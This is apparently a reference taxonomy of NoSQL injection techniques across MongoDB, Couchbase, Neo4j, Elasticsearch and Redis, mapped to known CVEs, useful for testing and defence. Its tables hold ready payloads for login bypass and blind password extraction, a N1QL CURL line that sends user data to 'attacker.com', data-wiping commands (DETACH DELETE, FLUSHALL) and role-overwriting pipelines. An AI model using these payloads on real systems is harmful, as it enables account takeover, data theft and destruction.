# NoSQL Injection Mutation/Variation Taxonomy

---

## Classification Structure

This taxonomy organizes the entire NoSQL injection attack surface along three orthogonal axes. **Axis 1 (Mutation Target)** defines *what structural component* of the database interaction is being manipulated — this is the primary axis and structures the main body of the document. **Axis 2 (Exploitation Mechanism)** describes *how* the mutation achieves its effect — the nature of the mismatch, confusion, or bypass that makes the injection work. **Axis 3 (Attack Outcome)** maps *where* each technique is weaponized — the real-world impact scenario.

NoSQL injection differs fundamentally from classical SQL injection in that there is no single query language to target. Instead, the attack surface fragments across multiple database engines (MongoDB, CouchDB, Couchbase, Neo4j, Redis, Elasticsearch, DynamoDB), multiple query interfaces (document-based operators, server-side JavaScript, aggregation pipelines, SQL-like query languages, graph query languages, key-value commands), and multiple input delivery channels (JSON bodies, URL-encoded parameters, HTTP headers, GraphQL resolvers). This fragmentation means that "NoSQL injection" is not a single vulnerability class but a *family* of injection primitives unified by their target: non-relational data stores.

The cross-cutting Axis 2 mechanisms that apply across all categories are:

| Mechanism | Description |
|-----------|-------------|
| **Type Confusion** | Converting a scalar value (string) into an object or array, causing the query engine to interpret it as an operator expression |
| **Operator Hijack** | Injecting unintended query operators (`$ne`, `$gt`, `$regex`, etc.) into a query that was designed to accept plain values |
| **Syntax Escape** | Breaking out of a string or value context to inject additional query logic, analogous to SQL injection quote escaping |
| **Validation Bypass** | Evading sanitization layers (ODM filters, middleware, WAF rules) through nesting, encoding, or structural manipulation |
| **Authorization Bypass** | Accessing data or operations beyond the intended scope through query manipulation (cross-collection reads, privilege escalation) |

---

## §1. Query Operator Injection

Query operator injection is the most prevalent and characteristic form of NoSQL injection. It exploits the fact that many NoSQL databases (particularly MongoDB) accept structured objects as query parameters, where special keys prefixed with `$` are interpreted as query operators rather than literal values. When an application passes user-controlled input directly into a query without type validation, an attacker can replace a scalar value with an operator expression.

### §1-1. Comparison Operator Injection

The simplest and most common form of NoSQL injection. Attackers replace expected string values with comparison operator objects to alter query logic.

| Subtype | Mechanism | Payload Example | Key Condition |
|---------|-----------|-----------------|---------------|
| **$ne (Not Equal)** | Returns all documents where the field does not equal the specified value. When injected into both username and password fields, returns the first document in the collection. | `{"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}` | Application passes raw objects to query without type checking |
| **$gt / $lt (Greater/Less Than)** | Comparison against empty string or zero matches all non-empty values, bypassing value-specific checks. | `{"username":{"$gt":""},"password":{"$gt":""}}` | Numeric or lexicographic comparison is meaningful for the target field |
| **$gte / $lte (Range Boundaries)** | Constrains results to a value range, enabling targeted extraction when combined with enumeration. | `{"username":{"$gte":"admin","$lte":"admin"},"password":{"$gte":""}}` | Used for narrowing blind extraction to specific records |
| **$in / $nin (Set Membership)** | `$in` matches any value in a provided array; `$nin` excludes values. Useful for targeting specific accounts or enumerating valid values. | `{"username":{"$in":["admin","administrator","root"]},"password":{"$ne":""}}` | Application accepts array values in operator position |
| **$exists (Field Presence)** | Matches documents based on whether a field exists, useful for probing schema and bypassing optional field checks. | `{"resetToken":{"$exists":true},"email":"admin@example.com"}` | Target field may or may not be present across documents |

### §1-2. Regular Expression Operator Injection

The `$regex` operator enables pattern matching against field values. When injected, it transforms exact-match queries into pattern-based queries, enabling both bypass and data extraction.

| Subtype | Mechanism | Payload Example | Key Condition |
|---------|-----------|-----------------|---------------|
| **Wildcard Match** | `^.*` matches any value, converting an exact-match check into a universal pass. | `{"username":"admin","password":{"$regex":"^.*"}}` | Application does not enforce type on the password parameter |
| **Prefix Extraction** | Sequential character testing via `^a`, `^ab`, `^abc` progressively reveals field values character by character. | `{"username":"admin","password":{"$regex":"^s3cr"}}` | Boolean-distinguishable response (different HTTP status, body, or timing) |
| **Length Probing** | `.{N}` patterns determine exact field value lengths before extraction. | `{"password":{"$regex":".{8}"}}` → true; `{"password":{"$regex":".{9}"}}` → false | Response differs between match and non-match |
| **Character Class Enumeration** | Tests for presence of character types (digits, special chars) to narrow the search space. | `{"password":{"$regex":"\\d"}}` (contains digit?) | Reduces brute-force space for subsequent prefix extraction |
| **Case-Insensitive Matching** | `$options: "i"` flag enables case-insensitive matching for username enumeration. | `{"username":{"$regex":"^admin","$options":"i"}}` | Username comparison is case-sensitive but attacker doesn't know exact case |

### §1-3. Logical Operator Injection

Logical operators (`$or`, `$and`, `$not`, `$nor`) alter the boolean structure of queries. When injected, they can add alternative conditions that always evaluate to true or combine with other operators for complex bypass chains.

| Subtype | Mechanism | Payload Example | Key Condition |
|---------|-----------|-----------------|---------------|
| **$or Always-True** | Adds an alternative condition that matches all documents, making the entire predicate true regardless of other clauses. | `{"$or":[{"username":"admin"},{"username":{"$ne":""}}]}` | Application does not validate top-level query keys |
| **$or Filter Nesting** | Nests dangerous operators (e.g., `$where`) inside `$or` arrays to bypass top-level-only sanitization checks. | `{"$or":[{"$where":"sleep(5000)"}]}` | Sanitizer inspects only top-level keys (CVE-2025-23061 pattern) |
| **$not Inversion** | Inverts a condition to match everything except the specified pattern. | `{"password":{"$not":{"$eq":"wrongpassword"}}}` | Less commonly filtered than `$ne` |

### §1-4. Evaluation Operator Injection

Evaluation operators execute expressions or code within the database engine, providing the most powerful injection primitives.

| Subtype | Mechanism | Payload Example | Key Condition |
|---------|-----------|-----------------|---------------|
| **$where JavaScript** | Executes arbitrary JavaScript expressions on the server. Detailed further in §3. | `{"$where":"this.username=='admin' && this.password.startsWith('a')"}` | `$where` not disabled; server-side JS enabled |
| **$expr Aggregation Expression** | Evaluates aggregation expressions within a find query, enabling cross-field comparisons and computed conditions. | `{"$expr":{"$eq":["$password","$username"]}}` | Less commonly restricted than `$where` |

---

## §2. Query Syntax Injection

Syntax injection occurs when user input is concatenated directly into a query string or template, allowing the attacker to break out of the intended value context and inject additional query logic. This parallels classical SQL injection and applies primarily to databases or drivers that construct queries via string concatenation.

### §2-1. String Boundary Escape

When a query is constructed by interpolating user input into a string template, special characters can terminate the string and inject new logic.

| Subtype | Mechanism | Payload Example | Key Condition |
|---------|-----------|-----------------|---------------|
| **Quote Escape (Single)** | Terminates a single-quoted string value and appends always-true logic. | Input: `admin' || '1'=='1` → Query becomes: `this.username == 'admin' || '1'=='1'` | Query built via string concatenation with single quotes |
| **Quote Escape (Double)** | Same principle with double-quoted contexts. | Input: `admin" || "1"=="1` | Double-quoted string interpolation |
| **Comment Injection** | Uses JavaScript or query-language comment syntax to discard the remainder of the injected context. | Input: `admin'; return true; //` | Server-side JavaScript context ($where or eval) |
| **Null Byte Truncation** | `%00` character truncates string processing in some parsers, discarding subsequent query constraints. | `username=admin%00&password=anything` | Backend language/parser is vulnerable to null byte termination |

### §2-2. Boolean Logic Manipulation

After escaping the value context, attackers inject conditions that alter the overall boolean evaluation of the query.

| Subtype | Mechanism | Payload Example | Key Condition |
|---------|-----------|-----------------|---------------|
| **Always-True Injection** | Appends `|| true` or equivalent to make the query match all documents. | `' || '1'=='1` or `' || true || '` | Injected expression is evaluated in boolean context |
| **Always-False with UNION** | Forces the original condition false, then injects a union/alternative to control which data is returned. | `' && 0 && 'x` (verification) vs. `' && 1 && 'x` (confirmation) | Used for detection — differential responses confirm injection |
| **Conditional Truth** | Injects conditions that are true only for specific records, enabling targeted data access. | `admin' && this.password.length > 5 && 'a'=='a` | Server-side JS context with object property access |

### §2-3. Fuzz String Detection

Systematic testing with special characters identifies injectable parameters by triggering syntax errors or behavioral changes.

| Fuzz String | Purpose |
|-------------|---------|
| `'"\`{ ;$Foo} $Foo \xYZ` | Baseline MongoDB fuzz string testing multiple escape vectors simultaneously |
| `'` (single quote) | Tests string boundary escape |
| `$ne` / `$gt` in URL params | Tests operator interpretation from URL-encoded input |
| `{"$gt":""}` in JSON body | Tests operator injection in JSON context |

---

## §3. Server-Side JavaScript Injection (SSJI)

MongoDB supports JavaScript execution in several contexts: the `$where` query operator, `$function` and `$accumulator` aggregation operators, and the (deprecated) `mapReduce` command. When user input reaches any of these contexts without sanitization, attackers can execute arbitrary JavaScript on the database server.

### §3-1. $where Clause Injection

The `$where` operator accepts a JavaScript expression or function that is evaluated for each document. It provides access to the document via `this` and to the full JavaScript runtime.

| Subtype | Mechanism | Payload Example | Key Condition |
|---------|-----------|-----------------|---------------|
| **Conditional Data Extraction** | JavaScript accessing `this.fieldName` extracts values character-by-character via boolean or timing oracles. | `admin' && this.password[0] == 'a' || 'a'=='b` | Boolean-distinguishable responses |
| **Regex-Based Extraction** | `this.field.match()` tests complex patterns within JavaScript context. | `admin' && this.password.match(/^[a-f]/) || 'a'=='b` | More efficient than single-char extraction |
| **Sleep-Based Timing Oracle** | `sleep()` introduces measurable delays conditional on data values, enabling blind extraction when responses are identical. | `{"$where":"if(this.password[0]=='a'){sleep(5000)}"}` | Timing differences detectable over network |
| **Conditional Timing Function** | Custom JavaScript function with busy-wait loop for more precise timing control. | `admin'+function(x){var w=new Date(new Date().getTime()+5000);while((x.password[0]==='a')&&w>new Date()){}}(this)+'` | Server-side JS execution enabled |
| **Error-Based Exfiltration** | `throw new Error()` with `JSON.stringify(this)` dumps document contents into error messages. | `{"$where":"throw new Error(JSON.stringify(this))"}` | Application returns detailed error messages (debug mode) |
| **Object.keys() Enumeration** | Extracts field names from documents without prior knowledge of the schema. | `{"$where":"Object.keys(this)[0].match('^.{0}a.*')"}` | Used when field names are unknown |

### §3-2. $function / $accumulator Injection

Available in MongoDB 4.4+, the `$function` and `$accumulator` aggregation operators execute JavaScript within aggregation pipelines.

| Subtype | Mechanism | Payload Example | Key Condition |
|---------|-----------|-----------------|---------------|
| **$function Code Execution** | Executes arbitrary JavaScript within an aggregation stage, with access to document fields. | `{"$function":{"body":"function(x){return x}","args":["$password"],"lang":"js"}}` | User input reaches aggregation pipeline definition |
| **$accumulator State Manipulation** | Custom JavaScript accumulator function with init, accumulate, merge, and finalize stages. | Inject into `accumulateArgs` or `body` of `$accumulator` | Aggregation pipeline injection (§4) as prerequisite |

### §3-3. mapReduce Injection (Legacy)

The `mapReduce` command (deprecated in MongoDB 5.0) accepts JavaScript `map` and `reduce` functions. In older deployments, user input reaching these functions enables arbitrary code execution.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Map Function Injection** | Arbitrary JavaScript in the `map` function has access to each document via `this`. | Application exposes mapReduce parameters to user input |
| **Reduce Function Injection** | Arbitrary JavaScript in the `reduce` function processes grouped results. | Legacy MongoDB deployment with mapReduce enabled |

---

## §4. Aggregation Pipeline Injection

MongoDB's aggregation framework provides a powerful, multi-stage data processing pipeline. When user input can influence pipeline stage definitions, attackers gain capabilities far beyond simple query manipulation — including cross-collection data access and data modification.

### §4-1. Cross-Collection Data Access

| Subtype | Mechanism | Payload Example | Key Condition |
|---------|-----------|-----------------|---------------|
| **$lookup (Left Outer Join)** | Reads data from any collection in the same database by performing a left outer join. Using non-existent field names for both `localField` and `foreignField` returns the entire target collection. | `{"$lookup":{"from":"users","localField":"_nonexistent","foreignField":"_nonexistent","as":"leaked"}}` | User input controls or extends aggregation pipeline stages |
| **$unionWith (Collection Union)** | Combines results from the current pipeline with the full contents of another collection, similar to SQL UNION ALL. | `{"$unionWith":{"coll":"users","pipeline":[{"$addFields":{"_src":"users"}}]}}` | Pipeline injection point exists |
| **$lookup with Sub-Pipeline** | More targeted extraction using filtered sub-pipeline within `$lookup`. | `{"$lookup":{"from":"users","pipeline":[{"$match":{"role":"admin"}}],"as":"admins"}}` | Allows pipeline nesting |
| **$graphLookup (Recursive)** | Performs recursive search across documents, useful for traversing hierarchical data structures. | `{"$graphLookup":{"from":"employees","startWith":"$managerId","connectFromField":"managerId","connectToField":"_id","as":"chain"}}` | Graph/hierarchical data model |

### §4-2. Data Modification via Aggregation

| Subtype | Mechanism | Payload Example | Key Condition |
|---------|-----------|-----------------|---------------|
| **$merge (Upsert into Collection)** | Writes aggregation results into a target collection, with options to insert, replace, merge, or fail on match. | `{"$merge":{"into":"users","whenMatched":"merge","whenNotMatched":"insert"}}` | Aggregation pipeline injection; write permissions |
| **$out (Replace Collection)** | Replaces an entire collection with the output of the aggregation pipeline. More destructive than `$merge`. | `{"$out":"users"}` | Write permissions; destructive capability |
| **$set + $merge (Field Modification)** | Combines `$set` to modify specific fields with `$merge` to write changes back, enabling targeted data tampering. | `[{"$match":{"email":"admin@site.com"}},{"$set":{"role":"superadmin"}},{"$merge":{"into":"users","whenMatched":"merge"}}]` | Pipeline injection with write permissions |

### §4-3. Internal Stage Abuse

| Subtype | Mechanism | Payload Example | Key Condition |
|---------|-----------|-----------------|---------------|
| **$mergeCursors (Shard Bypass)** | Internal stage for merging query results across shards. Improper authorization handling allows unauthorized data access by bypassing RBAC. | Specially crafted pipeline exploiting `$mergeCursors` | Sharded MongoDB deployment; CVE-2025-6713 |
| **Dummy $match Elimination** | `{"$match":{"_id":{"$exists":false}}}` returns zero results from the original collection, ensuring only cross-collection data (via `$lookup`/`$unionWith`) is returned. | Prepended to pipeline before `$unionWith` | Used to isolate cross-collection results |
| **$replaceWith (Document Swap)** | Replaces each document in the pipeline with a specified document, enabling injection of arbitrary content before `$merge`. | `{"$replaceWith":{"_id":"targetId","password":"newpass"}}` | Followed by `$merge` for data modification |

### §4-4. Pipeline Detection Indicators

When testing in black-box scenarios, the following indicators suggest aggregation pipeline injection:

- Request parameters accepting JSON arrays (e.g., `pipeline=[{...}]`)
- Presence of aggregation-specific operators in error messages (`$match`, `$group`, `$project`)
- Responses containing nested document structures from multiple collections
- Endpoint paths containing `/aggregate` or similar naming patterns

---

## §5. Database-Specific Query Language Injection

Several NoSQL databases implement SQL-like or domain-specific query languages that are vulnerable to injection through string concatenation, mirroring classical SQL injection patterns adapted to each language's syntax.

### §5-1. N1QL Injection (Couchbase)

N1QL (pronounced "nickel") extends SQL for JSON documents in Couchbase Server 4.0+. Injection follows SQL injection patterns but with Couchbase-specific functions and constraints.

| Subtype | Mechanism | Payload Example | Key Condition |
|---------|-----------|-----------------|---------------|
| **UNION-Based Extraction** | Appends UNION SELECT from system keyspaces to extract metadata and data from other buckets. | `city=' AND '1'='0' UNION SELECT * FROM system:keyspaces WHERE '1'='1` | String concatenation into N1QL query |
| **Boolean-Based Blind** | Character-by-character extraction using `SUBSTR()` and `ENCODE_JSON()` functions. | `city=X' AND '{' = SUBSTR(ENCODE_JSON((SELECT * FROM system:keyspaces ORDER BY id)),1,1) AND '1'='1` | Differential responses for true/false conditions |
| **CURL-Based SSRF** | N1QL's CURL() function (when enabled) makes HTTP requests from the database server, enabling SSRF. | `' UNION SELECT CURL('http://attacker.com/exfil?data=' || ENCODE_JSON((SELECT * FROM users))) --` | CURL feature enabled in Couchbase configuration |
| **System Keyspace Enumeration** | `system:keyspaces` and `system:datastores` expose database metadata for reconnaissance. | `UNION SELECT * FROM system:keyspaces` | Access to N1QL endpoint |

**N1QL Constraints**: Query stacking is not supported. Only C-style block comments (`/* */`) are available — line comments (`--`) do not exist. These limitations require different exploitation strategies compared to traditional SQL injection.

### §5-2. Cypher Injection (Neo4j)

Neo4j's Cypher query language is susceptible to injection when user input is concatenated into query strings.

| Subtype | Mechanism | Payload Example | Key Condition |
|---------|-----------|-----------------|---------------|
| **Boolean Tautology** | Injects always-true conditions into MATCH/WHERE clauses. | `' OR 1=1 WITH true AS ignored MATCH (n) RETURN n //` | String concatenation into Cypher query |
| **UNION-Based Extraction** | Appends UNION MATCH to extract data from other node types. | `' UNION MATCH (n:SecretNode) RETURN n.data //` | Application returns query results to client |
| **Error-Based via Date()** | Places extracted data inside the `Date()` function, which fails with an error message containing the data. | `' OR 1=1 WITH 1 as a CALL dbms.security.listUsers() YIELD username AS u RETURN Date(u) //` | Error messages returned to client |
| **Destructive Operations** | Injects `DETACH DELETE` to destroy graph data. | `1 OR 1=1 WITH true AS ignored MATCH (all) DETACH DELETE all //` | Write permissions; extremely dangerous |
| **Label/Type Bypass** | Node labels, relationship types, and property names cannot be parameterized in Cypher, requiring sanitization-based protection. | Dynamic label: `MATCH (n:` + userInput + `) RETURN n` | Dynamic label/type construction from user input |

### §5-3. CQL Injection (Cassandra)

Cassandra Query Language (CQL) closely resembles SQL, making CQL injection attacks structurally similar to SQL injection.

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **String Escape** | Breaking out of CQL string literals to inject additional WHERE clauses or UNION queries. | CQL query built via string concatenation |
| **ALLOW FILTERING Abuse** | Injecting `ALLOW FILTERING` to bypass query restrictions that normally prevent full-table scans. | Restricted queries that could be broadened |

### §5-4. CouchDB Mango Query Injection

CouchDB's Mango query API accepts JSON selector objects, making it susceptible to operator injection patterns similar to MongoDB.

| Subtype | Mechanism | Payload Example | Key Condition |
|---------|-----------|-----------------|---------------|
| **Selector Operator Injection** | Injecting `$ne`, `$regex`, `$or` into Mango selector objects. | `{"selector":{"username":{"$ne":null}}}` | User input reaches Mango selector without type validation |
| **HTTP API Direct Access** | CouchDB's REST API allows direct document CRUD; exposed endpoints enable data manipulation without injection. | `PUT /db/doc_id` with modified document | CouchDB API exposed without authentication |

### §5-5. Elasticsearch Query DSL Injection

Elasticsearch's JSON-based Query DSL can be exploited when user input is interpolated into query templates.

| Subtype | Mechanism | Payload Example | Key Condition |
|---------|-----------|-----------------|---------------|
| **Template Injection** | Mustache templates using `{{{...}}}` (triple braces) do not escape values, allowing JSON structure manipulation. | `{{{userInput}}}` where input is `","query":{"match_all":{}},"_source":["password"],"foo":"` | Unescaped template interpolation |
| **Query DSL Manipulation** | Injecting additional query clauses via string concatenation in query builders. | Escaped JSON breaking out of `match` into `bool`/`should` | Query built via string interpolation |
| **Script Injection** | Elasticsearch's Painless scripting (or deprecated Groovy) can be exploited for code execution. | `{"script":{"source":"Runtime.getRuntime().exec('cmd')"}}` | Scripting enabled; user input reaches script context |

### §5-6. Redis Command Injection

Redis operates on a command protocol rather than a query language, making injection a matter of command manipulation.

| Subtype | Mechanism | Payload Example | Key Condition |
|---------|-----------|-----------------|---------------|
| **Command Chaining** | Injecting additional Redis commands via newline characters in command parameters. | `key\r\nFLUSHALL\r\n` | Input reaches Redis command string without sanitization |
| **Lua Script Injection** | Redis EVAL command executes Lua scripts; injection enables arbitrary Lua code execution. | `EVAL "redis.call('SET','pwned','true')" 0` | User input reaches EVAL command arguments |
| **SSRF via Gopher Protocol** | Combining SSRF vulnerabilities with Redis protocol to execute arbitrary commands remotely. | `gopher://redis:6379/_*3%0d%0a$3%0d%0aSET%0d%0a...` | SSRF exists that can reach Redis port |

---

## §6. Input Delivery Channel Manipulation

The way user input is structured, encoded, and delivered to the application significantly affects whether injection is possible. Manipulating the input channel itself is often a prerequisite for operator injection (§1).

### §6-1. Content-Type Conversion

| Subtype | Mechanism | Payload Example | Key Condition |
|---------|-----------|-----------------|---------------|
| **URL-Encoded to JSON** | Switching Content-Type from `application/x-www-form-urlencoded` to `application/json` to send structured objects where the application expected flat strings. | Change `username=admin&password=pass` to `{"username":"admin","password":{"$ne":""}}` | Server-side framework parses both content types |
| **JSON to URL-Encoded** | Reversing: using URL-encoded array syntax to inject objects when the application expects JSON. | `username=admin&password[$ne]=` | Express/Node.js `qs` parser converts bracket notation to objects |

### §6-2. Parameter Format Exploitation

| Subtype | Mechanism | Payload Example | Key Condition |
|---------|-----------|-----------------|---------------|
| **Bracket Notation Array Injection** | Express-style query parsers interpret `param[$op]=value` as `{param: {$op: value}}`, converting flat parameters to nested objects. | `password[$ne]=invalid&password[$regex]=^a` | Node.js with `qs` or `express` default parser |
| **PHP Array Parameter** | PHP interprets `param[key]=value` as associative arrays, enabling operator injection from URL parameters. | `password[$ne]=1` in PHP → `array('$ne' => '1')` | PHP with MongoDB driver |
| **Duplicate Key Processing** | MongoDB processes duplicate JSON keys by retaining only the last occurrence. Can be used to override sanitized values. | `{"password":"sanitized","password":{"$ne":""}}` | Parser accepts duplicate keys; last-wins behavior |
| **GraphQL Filter Passthrough** | GraphQL resolvers that forward `args.filter` directly to `collection.find()` pass operator objects through the GraphQL layer. | GraphQL query: `{ users(filter: {password: {$ne: ""}}) { email } }` | Resolver does not validate/allowlist filter structure |

### §6-3. Encoding and Obfuscation

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Unicode Encoding** | Alternative representations of `$` and `.` characters to evade pattern-based sanitizers. | Sanitizer uses simple string matching rather than decoded comparison |
| **URL Encoding** | `%24ne` for `$ne`, `%2e` for `.` to bypass filters checking literal characters. | Filter applies before URL decoding |
| **Double Encoding** | `%2524ne` decodes to `%24ne` on first pass, then `$ne` on second pass. | Multiple decoding layers in the request pipeline |
| **JSON Unicode Escape** | `\u0024ne` in JSON represents `$ne` and may bypass string-level filters before JSON parsing. | Filter inspects raw JSON string before deserialization |

---

## §7. ODM/ORM and Middleware Layer Bypass

Object-Document Mappers (ODMs like Mongoose) and sanitization middleware (like `express-mongo-sanitize`) are designed to prevent NoSQL injection. However, implementation gaps create bypass opportunities.

### §7-1. Mongoose Sanitization Bypass

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **$or Nesting Bypass** | Mongoose's `sanitizeFilter` inspects only top-level properties of objects. Wrapping `$where` inside an `$or` array bypasses the check because the sanitizer does not recurse into array elements. The payload reaches the `sift` library for evaluation, enabling RCE. | Mongoose < 8.9.5; `populate().match()` with user-controlled filter (CVE-2025-23061) |
| **Incomplete Patch Iteration** | CVE-2025-23061 was an incomplete fix for CVE-2024-53900. The original fix blocked direct `$where` injection but not `$where` nested within `$or`. This pattern of incremental bypass is common in sanitization layers. | Mongoose 8.8.3–8.9.4 (patched first CVE but not second) |
| **populate().match() Attack Surface** | Mongoose's `populate()` method with a `match` parameter passes user-controlled objects into query construction. This is a less obvious injection surface compared to direct `find()` calls. | Application uses `populate().match(userInput)` |

### §7-2. Middleware Sanitization Bypass

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **express-mongo-sanitize Scope** | Strips keys starting with `$` and containing `.` from req.body/query/params/headers. Does not sanitize nested objects beyond configured depth, and `allowDots: true` disables dot-stripping. | Default configuration with specific edge cases |
| **Prototype Pollution Chain** | If a prototype pollution vulnerability exists elsewhere in the application, polluting `Object.prototype` with operator keys can inject operators into queries that don't directly use user input. | Prototype pollution prerequisite in same application |
| **Pre-Parsing Bypass** | If sanitization runs after body parsing but before all middleware, late-bound parameters or re-parsed bodies may not be sanitized. | Complex middleware ordering; multiple body parsers |
| **mongo-sanitize Bypass** | Simpler sanitizers that only check for `$` at key starts can be bypassed by operators that don't use `$` prefix in certain contexts. | Using older or incomplete sanitization libraries |

### §7-3. Framework-Level Injection Surfaces

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Spring Data MongoDB @Query** | Spring's `@Query` annotation with string-based queries allows injection if parameters are interpolated rather than bound. | `@Query("{'field': '?0'}")` with unparameterized input |
| **Spring N1QL @Query** | Similar to the above but for Couchbase integration via Spring Data. | `@Query("#{#n1ql.selectEntity} WHERE field = '#{[0]}'")` |
| **Django Raw Queries** | Django's `raw()` method on MongoDB backends bypasses the ORM's parameterization. | `collection.find(json.loads(user_input))` |

---

## §8. Blind Extraction Techniques

When direct data leakage is not possible (no visible output, no error messages), blind extraction techniques infer data bit-by-bit through observable side channels.

### §8-1. Boolean-Based Blind Extraction

The attacker injects conditions that alter a binary observable (HTTP status code, response body length, redirect behavior) depending on whether the condition is true or false.

| Subtype | Mechanism | Payload Example | Key Condition |
|---------|-----------|-----------------|---------------|
| **Operator Boolean Oracle** | `$regex` prefix matching produces true/false responses. Iterate through character positions and values to reconstruct field contents. | `{"username":"admin","password":{"$regex":"^a"}}` → 200; `{"username":"admin","password":{"$regex":"^b"}}` → 401 | Different HTTP status or response for match vs. no-match |
| **$where Boolean Oracle** | JavaScript expressions accessing `this.field[N]` test individual characters. | `admin' && this.password[0]=='a' || 'a'=='b` | Server-side JS enabled; differential responses |
| **Field Existence Probing** | `$exists: true` on various field names determines the schema. | `{"secretField":{"$exists":true},"username":"admin"}` | Response differs based on field existence in matched document |
| **Object.keys() Enumeration** | Character-by-character extraction of field names via `Object.keys(this)[N].match()` pattern. | `{"$where":"Object.keys(this)[1].match('^.{0}p.*')"}` | Unknown schema; SSJI enabled |
| **Length-First Strategy** | Determine field value length with `.{N}` regex before starting character extraction, optimizing the extraction process. | Step 1: `{"password":{"$regex":".{8}"}}` → true; `.{9}` → false (length=8). Step 2: Extract 8 characters. | Reduces total requests needed |

### §8-2. Time-Based Blind Extraction

When responses are identical regardless of query result, timing side channels enable extraction.

| Subtype | Mechanism | Payload Example | Key Condition |
|---------|-----------|-----------------|---------------|
| **sleep() Direct** | MongoDB's `sleep()` function in `$where` causes a measurable delay when the injection point is reached. | `{"$where":"sleep(5000)"}` | Confirms injection exists; SSJI enabled |
| **Conditional sleep()** | `sleep()` triggered only when a data-dependent condition is true. | `{"$where":"if(this.password[0]=='a'){sleep(5000)}"}` | Per-character extraction via timing |
| **Busy-Wait Loop** | JavaScript while-loop checking `new Date()` provides more portable timing than `sleep()`. | `function(x){var w=new Date(new Date().getTime()+5000);while(x.password[0]==='a'&&w>new Date()){}}(this)` | Environments where `sleep()` is unavailable |
| **Heavy Computation** | CPU-intensive operations (regex backtracking, large loops) cause measurable delay without explicit sleep functions. | `{"$where":"var i=0;while(i<1000000){i++};return this.x=='a'"}` | `sleep()` disabled but JS execution permitted |
| **N1QL Timing** | Nested queries with CPU-intensive operations in Couchbase cause detectable delays. | Nested SELECT with complex ENCODE_JSON operations | Couchbase deployment with N1QL |

### §8-3. Error-Based Extraction

Intentionally triggered errors that include data in error messages.

| Subtype | Mechanism | Payload Example | Key Condition |
|---------|-----------|-----------------|---------------|
| **throw new Error()** | JavaScript throw in `$where` includes serialized document data in the error message. | `{"$where":"throw new Error(JSON.stringify(this))"}` | Error messages returned to client; debug mode |
| **Type Coercion Error** | Forcing type errors that include the value being coerced in the error message. | Cypher `Date()` function with non-date data | Error verbosity enabled |
| **Syntax Error Fingerprinting** | Injecting syntax errors to identify database engine type and version from error message format. | `'"\`{ ;$Foo} $Foo \xYZ` | Error messages not fully suppressed |

---

## §9. Second-Order and Chained Attacks

NoSQL injection payloads may not execute immediately upon injection but instead lie dormant until triggered by a subsequent operation.

### §9-1. Stored Payload Execution

| Subtype | Mechanism | Key Condition |
|---------|-----------|---------------|
| **Second-Order Injection** | Malicious input is stored in the database and later used in a query by a different part of the application without sanitization. For example, a username containing `{"$ne":""}` stored during registration, later used unsanitized in a search query. | Different code paths for storage vs. retrieval/usage |
| **Deferred Processing** | Input queued for background processing (job queues, batch operations) is later used in database queries without re-validation. | Asynchronous processing pipeline |
| **Cross-Service Injection** | Malicious data stored by one microservice is consumed by another service that trusts internal data and doesn't sanitize it before using it in queries. | Microservice architecture with shared database |

### §9-2. Injection Chain Escalation

| Subtype | Chain | Impact |
|---------|-------|--------|
| **NoSQLi → Authentication Bypass → Account Takeover** | Operator injection on login → access as admin → full application compromise | Authentication bypass escalated to full access |
| **NoSQLi → Token Extraction → Password Reset Hijack** | Blind extraction of password reset tokens or 2FA secrets → account takeover without credentials | Blind data extraction escalated to account takeover |
| **SSRF → Redis → RCE** | SSRF vulnerability reaches Redis service → Lua script injection → command execution on Redis host | Protocol-level chaining |
| **NoSQLi → Aggregation → Cross-Collection Read → Privilege Escalation** | Operator injection in find() → pivot to aggregation pipeline → $lookup on admin collection → extract admin credentials | Query-level escalation to data-level impact |
| **NoSQLi → $merge → Data Tampering** | Aggregation pipeline injection → $merge to overwrite user roles/permissions in target collection | Read-level injection escalated to write-level impact |
| **Prototype Pollution → NoSQLi** | Prototype pollution sets `Object.prototype.$gt = ""` → all subsequent queries include implicit operator → universal bypass | Requires separate prototype pollution vulnerability |

---

## Attack Scenario Mapping (Axis 3)

| Scenario | Architecture / Conditions | Primary Mutation Categories |
|----------|--------------------------|----------------------------|
| **Authentication Bypass** | Login form passing user input to `find()` or `findOne()` without type validation | §1-1 + §1-2 + §6-1 |
| **Blind Data Exfiltration** | No direct data output; requires oracle-based character extraction | §1-2 + §3-1 + §8-1 + §8-2 |
| **Direct Data Leakage** | Application returns query results or error messages containing data | §4-1 + §5-1 + §8-3 |
| **Remote Code Execution** | Server-side JavaScript enabled; SSJI context reachable | §3 + §5-6 (Redis Lua) |
| **Cross-Collection Data Access** | Aggregation pipeline injection point exists | §4-1 + §4-3 |
| **Data Modification / Destruction** | Write permissions; aggregation or direct write operations accessible | §4-2 + §5-2 (Cypher DELETE) + §5-6 (Redis FLUSHALL) |
| **Server-Side Request Forgery** | N1QL CURL enabled; Redis reachable via SSRF chain | §5-1 (N1QL CURL) + §5-6 (Gopher→Redis) |
| **Denial of Service** | Resource-intensive operations available (regex backtracking, heavy JS computation, N1QL nested queries) | §3-1 + §5-1 + §8-2 |
| **WAF / Filter Bypass** | Security middleware deployed but bypassable | §6-3 + §7-1 + §7-2 |
| **Account Takeover** | Password reset or 2FA mechanism uses queryable tokens | §1-2 + §8-1 + §9-2 |

---

## CVE / Bounty Mapping (2023–2025)

| Mutation Combination | CVE / Case | Impact / Bounty |
|---------------------|-----------|----------------|
| §7-1 (Mongoose $or nesting bypass) | CVE-2025-23061 (Mongoose < 8.9.5) | RCE via `$where` in `populate().match()`. Incomplete fix for CVE-2024-53900. CVSS 9.1 |
| §7-1 (Mongoose populate().match()) | CVE-2024-53900 (Mongoose < 8.8.3) | RCE via `$where` injection through `populate().match()` function |
| §4-3 ($mergeCursors authorization bypass) | CVE-2025-6713 (MongoDB Server < 8.0.7) | Unauthorized data access bypassing RBAC in sharded deployments. CVSS 7.7 |
| §1-1 (Operator injection on password reset) | CVE-2024-48573 (AquilaCMS ≤ 1.409.20) | Unauthenticated password reset for any user including admin |
